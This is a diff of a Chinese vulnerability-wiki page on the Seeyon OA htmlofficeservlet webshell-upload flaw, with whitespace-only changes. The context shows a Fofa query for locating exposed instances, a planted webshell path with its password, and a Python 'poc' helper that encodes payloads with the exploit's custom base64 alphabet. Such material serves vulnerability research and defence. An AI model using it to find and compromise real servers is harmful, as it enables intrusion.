@@ -22,7 +22,7 @@ alt=\"1.png\" class=\"large\" onclick=\"window.open(this.src)\" /\>
 
 ### 指纹
 
-    https://www.0-sec.org/seeyon/htmlofficeservlet/seeyon/index.jsp
+    https://www.0-sec.org/seeyon/htmlofficeservlet /seeyon/index.jsp
     seeyon
     Fofa：app="用友-致远OA"
 
@@ -45,9 +45,9 @@ webshell地址为**https://www.0-sec.org/seeyon/test123456.jsp**，密码为：a
 ### poc
 
     from sys import argv
-
+    
     letters = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"
-
+    
     def base64_encode(input_str):
         str_ascii_list = ['{:0>8}'.format(str(bin(ord(i))).replace('0b', ''))
                           for i in input_str]
@@ -68,7 +68,7 @@ webshell地址为**https://www.0-sec.org/seeyon/test123456.jsp**，密码为：a
             str_ascii_list = str_ascii_list[3:]
         output_str = output_str + '=' * equal_num
         return output_str
-
+    
     def base64_decode(input_str):
         str_ascii_list = ['{:0>6}'.format(str(bin(letters.index(i))).replace('0b', ''))
                           for i in input_str if i != '=']
@@ -84,7 +84,7 @@ webshell地址为**https://www.0-sec.org/seeyon/test123456.jsp**，密码为：a
             output_str += ''.join([chr(x) for x in temp_str_list])
             str_ascii_list = str_ascii_list[4:]
         return output_str
-
+    
     if __name__ == "__main__":
         if len(argv) == 2:
             print(base64_decode(argv[1]))
